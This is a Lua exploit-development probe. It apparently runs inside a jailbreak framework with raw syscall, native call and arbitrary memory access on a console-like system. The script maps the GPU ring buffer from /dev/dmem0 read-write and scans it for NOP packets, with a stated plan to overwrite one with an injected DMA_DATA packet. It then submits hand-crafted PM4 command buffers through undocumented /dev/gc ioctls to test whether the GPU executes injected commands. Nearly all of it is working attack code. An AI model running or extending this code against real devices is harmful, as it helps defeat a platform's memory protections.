-- CRASH_CLASS: HIGH
-- PROBE 530h: Inject DMA_DATA into existing GPU command buffer
--
-- 530a/530b: ioctl 0xC0108102 accepts but GPU doesn't execute our cmds.
-- 528w: dmem0 offset 0 has the GFX ring buffer with PM4 state init.
-- The GFX ring ends with a big NOP packet at offset 0x52C.
--
-- Hypothesis: if we overwrite the NOP packet with a DMA_DATA packet,
-- AND the GPU re-reads the ring (which it does on submission),
-- it might execute our injected DMA_DATA.
--
-- Risk: writing to the active GPU ring could crash the GPU/process.
-- Mitigation: use small write, restore after test.
--
-- Alternative: find the ring write pointer and append after it.
--
-- Also test: ioctl 0xC010810B may be a "wait for idle" or "get status"
-- that tells us if the GPU processed our submit.

print("=== PROBE 530h: RING BUFFER INJECT ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)

local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1))
for _, sig in ipairs({10, 11, 12, 13}) do
    pcall(function() mk(416)(uint64(sig), sa_buf, uint64(0)) end)
end

local sc_477 = mk(477)
local sc_73 = mk(73)
local sc_ioctl = mk(54)
local PAGE = 0x4000

-- Open devices
local function open_dev(name)
    local devpath = memory.alloc(0x30)
    for i = 1, #name do wd(N(devpath) + i - 1, string.byte(name, i)) end
    wd(N(devpath) + #name, 0)
    return N(native.fcall_with_rax(stub, 5, uint64(N(devpath)), uint64(2), uint64(0)))
end

local dm_fd = open_dev("/dev/dmem0")
local gc_fd = open_dev("/dev/gc")
print("dmem0=" .. dm_fd .. " gc=" .. gc_fd)

-- Get libkernel
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0x2001), ib) end)
local lk_lo = rd(N(ib) + 0x108) or 0
local lk_hi = rd(N(ib) + 0x10C) or 0
if lk_lo < 0 then lk_lo = lk_lo + 0x100000000 end
if lk_hi < 0 then lk_hi = lk_hi + 0x100000000 end
local lk_base = uint64(string.format("0x%X%08X", lk_hi, lk_lo))
local alloc_fn = lk_base + uint64(0x17EF0)

-- Allocate src and dst buffers
local phys = {}
local va = {}
for i = 1, 2 do
    local phys_out = memory.alloc(8)
    wq(N(phys_out), uint64(0))
    pcall(function()
        native.fcall_with_rax(alloc_fn, 0,
            uint64(0), uint64("0x150000000"), uint64(PAGE),
            uint64(PAGE), uint64(0), uint64(N(phys_out)))
    end)
    phys[i] = rq(N(phys_out))
    local ph, pl = get_hi_lo(phys[i])
    if ph < 0 then ph = ph + 0x100000000 end
    if pl < 0 then pl = pl + 0x100000000 end
    local ok_m, rv_m = pcall(function()
        return sc_477(uint64(0), uint64(PAGE), uint64(3), uint64(1),
                       uint64(dm_fd), uint64(string.format("0x%X%08X", ph, pl)))
    end)
    if ok_m and rv_m then
        local rh = get_hi_lo(rv_m)
        if rh < 0 then rh = rh + 0x100000000 end
        if rh ~= 0xFFFFFFFF then va[i] = N(rv_m) end
    end
end

if not va[1] or not va[2] then print("ALLOC FAIL"); return end

-- Write pattern to src, zero dst
for off = 0, 0x3F, 4 do
    wd(va[1] + off, 0xDEADBEEF + off)
    wd(va[2] + off, 0)
end
print(string.format("src=%s dst=%s", fmt(phys[1]), fmt(phys[2])))

-- ============================================================
-- [A] Map dmem0 ring buffer (offset 0) with RW
-- ============================================================
print("")
print("[A] Map ring buffer RW")

local ring_size = 4 * PAGE  -- 64 KB
local ok_r, rv_r = pcall(function()
    return sc_477(uint64(0), uint64(ring_size), uint64(3), uint64(1), uint64(dm_fd), uint64(0))
end)
if not ok_r or not rv_r then print("FAIL ring mmap"); return end
local rh = get_hi_lo(rv_r)
if rh < 0 then rh = rh + 0x100000000 end
if rh == 0xFFFFFFFF then print("FAIL ring -1"); return end
local ring_va = N(rv_r)
print(string.format("  ring_va=0x%X", ring_va))

-- Verify we can read the NOP at offset 0x52C
local nop_val = rd(ring_va + 0x52C)
if nop_val then
    if nop_val < 0 then nop_val = nop_val + 0x100000000 end
    print(string.format("  ring[0x52C]=0x%08X (expect NOP 0xC0FF1000 area)", nop_val))
end

-- ============================================================
-- [B] Read the current ring state more carefully
-- Find where the NOP area starts and how big it is
-- ============================================================
print("")
print("[B] Ring NOP area analysis")

local nop_start = -1
local nop_end = -1
for off = 0, ring_size - 4, 4 do
    local d = rd(ring_va + off)
    if d then
        if d < 0 then d = d + 0x100000000 end
        local ptype = math.floor(d / 0x40000000) % 4
        local op = math.floor(d / 0x100) % 0x100
        if ptype == 3 and op == 0x10 then  -- NOP
            if nop_start == -1 then nop_start = off end
            local count = math.floor(d / 0x10000) % 0x4000 + 1
            nop_end = off + (count + 1) * 4
            off = nop_end - 4  -- skip NOP payload
        end
    end
end
print(string.format("  NOP region: 0x%X - 0x%X (%d bytes)", nop_start, nop_end, nop_end - nop_start))

-- ============================================================
-- [C] FIRST: test fence via ioctl submit (no ring injection)
-- Write a RELEASE_MEM in our OWN cmd buffer + submit via ioctl
-- Use the FENCE to detect if GPU executed ANYTHING
-- ============================================================
print("")
print("[C] Fence test via ioctl submit")

-- Allocate cmd buffer in heap (simpler)
local cmd_buf = memory.alloc(0x200)
local fence_buf = memory.alloc(0x10)
wq(N(fence_buf), uint64(0))

-- Write a simple EVENT_WRITE_EOP that writes a value to fence
-- EVENT_WRITE_EOP (0x47): writes data to memory at end of pipe
-- Header: (3<<30)|(4<<16)|(0x47<<8) = 0xC0044700
wd(N(cmd_buf) + 0x00, 0xC0044700)
-- event_cntl: event_type=0x04 (CACHE_FLUSH_AND_INV_TS_EVENT), event_index=5
wd(N(cmd_buf) + 0x04, 0x00000504)
-- addr_lo (must be 8-byte aligned)
local fence_h, fence_l = get_hi_lo(uint64(string.format("0x%X", N(fence_buf))))
if fence_l < 0 then fence_l = fence_l + 0x100000000 end
if fence_h < 0 then fence_h = fence_h + 0x100000000 end
wd(N(cmd_buf) + 0x08, fence_l)
-- addr_hi | data_sel(29:24)=1 (send 32bit data) | int_sel(16)=0
wd(N(cmd_buf) + 0x0C, fence_h + 0x01000000)  -- data_sel = 1
-- data_lo
wd(N(cmd_buf) + 0x10, 0xBEEF1234)

-- Build descriptor
local desc = memory.alloc(0x10)
local cmd_h, cmd_l = get_hi_lo(uint64(string.format("0x%X", N(cmd_buf))))
if cmd_l < 0 then cmd_l = cmd_l + 0x100000000 end
if cmd_h < 0 then cmd_h = cmd_h + 0x100000000 end
wd(N(desc) + 0, 0xC0023F00)  -- INDIRECT_BUF header
wd(N(desc) + 4, cmd_l)
wd(N(desc) + 8, cmd_h)
wd(N(desc) + 12, 5)  -- 5 dwords

-- Submit
local sub = memory.alloc(0x10)
wd(N(sub), 0)
wd(N(sub) + 4, 1)
local desc_h2, desc_l2 = get_hi_lo(desc)
if desc_l2 < 0 then desc_l2 = desc_l2 + 0x100000000 end
if desc_h2 < 0 then desc_h2 = desc_h2 + 0x100000000 end
wd(N(sub) + 8, desc_l2)
wd(N(sub) + 12, desc_h2)

local ok_s, rv_s = pcall(function()
    return sc_ioctl(uint64(gc_fd), uint64(0xC0108102), uint64(N(sub)))
end)
print(string.format("  submit rv=%d", rv_s and N(rv_s) or -999))

-- Wait and check fence
local dummy = 0
for i = 1, 1000000 do dummy = dummy + 1 end

local fval = rd(N(fence_buf))
if fval and fval < 0 then fval = fval + 0x100000000 end
print(string.format("  fence=0x%X (want 0xBEEF1234) match=%s", fval or 0, tostring(fval == 0xBEEF1234)))

-- Also check 0xC010810B after submit
local qbuf = memory.alloc(0x20)
for i = 0, 0x1F, 4 do wd(N(qbuf) + i, 0) end
pcall(function() sc_ioctl(uint64(gc_fd), uint64(0xC010810B), uint64(N(qbuf))) end)
print("  ioctl 0B after submit:")
for i = 0, 3 do
    local d = rd(N(qbuf) + i * 4)
    if d and d < 0 then d = d + 0x100000000 end
    print(string.format("    [+%d] 0x%08X", i*4, d or 0))
end

-- ============================================================
-- [D] Check if dst buffer changed (from the 530b-style DMA)
-- We're reusing the same submit path but with fence to detect execution
-- ============================================================
print("")
print("[D] DMA + fence combined")

-- Zero the cmd buf
for off = 0, 0x100, 4 do wd(N(cmd_buf) + off, 0) end
wq(N(fence_buf), uint64(0))

-- First: DMA_DATA to copy src→dst
local src_ph2, src_pl2 = get_hi_lo(phys[1])
if src_ph2 < 0 then src_ph2 = src_ph2 + 0x100000000 end
if src_pl2 < 0 then src_pl2 = src_pl2 + 0x100000000 end
local dst_ph2, dst_pl2 = get_hi_lo(phys[2])
if dst_ph2 < 0 then dst_ph2 = dst_ph2 + 0x100000000 end
if dst_pl2 < 0 then dst_pl2 = dst_pl2 + 0x100000000 end

-- Use CPU VA this time (since phys didn't work either)
wd(N(cmd_buf) + 0x00, 0xC0055002)  -- DMA_DATA header
wd(N(cmd_buf) + 0x04, 0x80000000)  -- cp_sync
wd(N(cmd_buf) + 0x08, src_pl2)
wd(N(cmd_buf) + 0x0C, src_ph2)
wd(N(cmd_buf) + 0x10, dst_pl2)
wd(N(cmd_buf) + 0x14, dst_ph2)
wd(N(cmd_buf) + 0x18, 64)

-- Then: EVENT_WRITE_EOP fence
wd(N(cmd_buf) + 0x1C, 0xC0044700)
wd(N(cmd_buf) + 0x20, 0x00000504)
wd(N(cmd_buf) + 0x24, fence_l)
wd(N(cmd_buf) + 0x28, fence_h + 0x01000000)
wd(N(cmd_buf) + 0x2C, 0xCAFE5678)

-- Update descriptor size
wd(N(desc) + 12, 12)  -- 12 dwords total

local ok_d, rv_d = pcall(function()
    return sc_ioctl(uint64(gc_fd), uint64(0xC0108102), uint64(N(sub)))
end)
print(string.format("  submit rv=%d", rv_d and N(rv_d) or -999))

for i = 1, 1000000 do dummy = dummy + 1 end

fval = rd(N(fence_buf))
if fval and fval < 0 then fval = fval + 0x100000000 end
print(string.format("  fence=0x%X (want 0xCAFE5678)", fval or 0))

local d0 = rd(va[2])
if d0 and d0 < 0 then d0 = d0 + 0x100000000 end
print(string.format("  dst[0]=0x%X (want 0xDEADBEEF)", d0 or 0))

-- Cleanup
pcall(function() sc_73(rv_r, uint64(ring_size)) end)
pcall(function() native.fcall_with_rax(stub, 6, uint64(gc_fd)) end)
pcall(function() native.fcall_with_rax(stub, 6, uint64(dm_fd)) end)

print("")
print("=== 530h DONE ===")
